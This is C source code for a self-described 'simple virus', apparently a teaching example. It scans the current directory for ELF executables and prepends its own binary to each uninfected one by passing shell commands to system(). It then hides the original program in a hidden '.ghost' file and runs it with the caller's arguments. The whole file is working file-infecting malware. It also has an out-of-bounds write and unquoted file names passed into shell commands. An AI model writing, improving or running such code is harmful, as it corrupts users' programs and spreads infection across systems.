#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>

    
//Variables for directory search.
struct dirent *dp;
char victim_name[64];   //Holds target name
unsigned char elftest[4];   //Holds first 4 bytes of file.
int check;   //Holds value to determine if file is clean.

//Variables for infection.
char cmd1[256], cmd2[256];  //Buffers to piece together system calls.

//Variables to pretend to be original file.
char spoof[65536];
int total_size, virus_size, victim_size;
    
int main(int argc, char *argv[])
{   
	printf("Hello! I am a simple virus!\n");
	DIR *dir = opendir(".");
	if (dir) {
		for (dp = readdir(dir); dp != NULL; dp = readdir(dir)) {
			strncpy(victim_name, dp -> d_name, 63);
			victim_name[64] = '\0';

			FILE *victim = fopen(victim_name,"rb");
			if (victim == NULL)
				continue;   //File cannot be opened.
			else {
				for (int i = 0; i < 4; i++)
					elftest[i] = fgetc(victim);
				
				//Check if its an ELF file and not infecting itself.
				if (elftest[1] == 'E' && elftest[2] == 'L' 
				&& elftest[3] == 'F' && (strcmp(victim_name,"virus")) != 0) {
					//Check for the file signature.  
					//The word virus should be in the code.				
					strcpy (cmd1, "grep -o 'simple virus' ");
					strcpy (cmd2, " | wc -l > grep_output.txt");
					strcat (cmd1, victim_name);
					strcat (cmd1, cmd2);
					system (cmd1);
					
					//Get the results of the grep check.
					FILE *sigcheck = fopen("grep_output.txt","r");
					if (sigcheck == NULL)
						return 0;   //File cannot be opened.
					fscanf (sigcheck, "%d", &check);
					fclose (sigcheck);
					system ("rm grep_output.txt");
					fclose (victim);
					
					//Concatenate the files and replace the original victim file.
					if (check == 0) {
						strcpy (cmd1, "cat virus ");
						strcat (cmd1, victim_name);
						strcpy (cmd2, " > temp");
						strcat (cmd1, cmd2);
						system (cmd1);
						system ("chmod +x temp");
						rename ("temp",victim_name);
					}
				}
			}
		}
	}

        FILE *total = fopen(argv[0],"rb");
        if (total == NULL)
		return 0;   //File cannot be opened.
	FILE *ghost = fopen(".ghost","wb");
	if (ghost == NULL)
		return 0;   //File cannot be opened.
        FILE *virus = fopen("virus","rb");
        if (virus == NULL)
		return 0;   //File cannot be opened.
	else {	
        //Get the original size of the victim file.  
        //Set that as the starting point to read.
        fseek (total, 0, SEEK_END);
        fseek (virus, 0, SEEK_END);
        total_size = ftell (total);
        virus_size = ftell (virus);
        victim_size = total_size - virus_size;
        fseek(total, virus_size, SEEK_SET);
        
        //Toss the "fake" file into ghost!
        unsigned char *buffer = (char*) malloc(victim_size);
        fread(buffer, 4, victim_size, total);
        fwrite(buffer, 4, victim_size, ghost);
        
        //Clean-up duty.
        fclose (virus);
        fclose (total);
        fclose (ghost);
	closedir (dir);
        
        //Time to run the "fake" program!
        system ("chmod +x .ghost");
        if      (argc == 1)
        	 snprintf(spoof, 65536, "./.ghost");
        else if (argc == 2) 
                snprintf(spoof, 65536, "./.ghost %s", argv[1]);
        else if (argc == 3) 
                snprintf(spoof, 65536, "./.ghost %s %s", argv[1], argv[2]);
        else if (argc == 4) 
                snprintf(spoof, 65536, "./.ghost %s %s %s", argv[1], argv[2], argv[3]);
        else if (argc == 5)
                snprintf(spoof, 65536, "./.ghost %s %s %s %s", argv[1], argv[2], argv[3], argv[4]);
        system (spoof);
        system ("rm .ghost");

        return 0;
        }
}

